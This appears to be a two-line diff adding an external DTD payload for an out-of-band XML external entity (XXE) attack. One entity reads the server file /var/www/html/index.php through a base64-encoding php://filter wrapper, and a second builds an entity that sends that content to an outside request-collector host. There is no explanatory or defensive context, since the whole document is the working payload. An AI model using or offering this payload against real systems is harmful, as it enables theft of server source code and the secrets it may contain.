@@ -1,0 +1,2 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://var/www/html/index.php">
+<!ENTITY % send "<!ENTITY exp SYSTEM 'http://requvkjsestbin.net/r/w1usrfw1/%file;'>" >
